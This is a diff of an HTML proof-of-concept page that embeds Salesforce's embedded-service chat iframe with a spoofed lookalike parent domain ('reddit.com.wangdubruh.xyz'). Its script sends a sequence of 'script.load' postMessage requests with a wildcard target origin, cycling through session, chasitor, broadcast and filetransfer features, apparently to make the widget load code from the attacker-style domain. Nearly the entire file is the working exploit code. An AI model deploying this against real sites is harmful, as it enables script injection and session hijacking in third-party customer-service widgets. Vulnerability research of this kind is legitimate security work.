@@ -1,27 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PoC: script.load abuse</title>
+  <title>Salesforce Feature Loader PoC</title>
 </head>
 <body>
-  <h2>[+] Iframe loaded (script.load test)</h2>
-  <iframe id="salesforce" src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz" style="width:600px;height:400px;border:1px solid #ccc;"></iframe>
+  <h2>[+] Salesforce Feature Loader PoC</h2>
+  <iframe id="eswFrame" src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz" style="width:600px;height:400px;border:1px solid black;"></iframe>
 
   <script>
-    const iframe = document.getElementById("salesforce");
+    const iframe = document.getElementById("eswFrame");
+    const deploymentId = "test123";
+    const domain = "reddit.com.wangdubruh.xyz";
 
-    iframe.onload = () => {
-      console.log("[📤] Sending: script.load");
-      iframe.contentWindow.postMessage({
-        method: "script.load",
-        domain: "reddit.com.wangdubruh.xyz",
-        data: "session"
-      }, "*");
-    };
+    const features = ["session", "chasitor", "broadcast", "filetransfer"];
+    let featureIndex = 0;
 
-    window.addEventListener("message", (event) => {
-      console.log("[📩] Message from iframe:", event.data);
+    window.addEventListener("message", (e) => {
+      console.log("[📩] Message from iframe:", e.data);
+
+      // When iframe is ready, begin testing
+      if (e.data?.method === "session.onLoad") {
+        console.log("[+] Iframe loaded (Salesforce 4.0)");
+        loadNextFeature();
+      }
     });
+
+    function loadNextFeature() {
+      if (featureIndex >= features.length) {
+        console.log("✅ All feature load attempts complete.");
+        return;
+      }
+
+      const feature = features[featureIndex++];
+      console.log(`[📤] Sending script.load for feature: '${feature}'`);
+
+      try {
+        iframe.contentWindow.postMessage({
+          method: "script.load",
+          domain,
+          data: feature
+        }, "*");
+      } catch (err) {
+        console.error(`[❌] Error sending script.load for '${feature}':`, err);
+      }
+
+      // Wait and try next
+      setTimeout(loadNextFeature, 1500);
+    }
   </script>
 </body>
 </html>
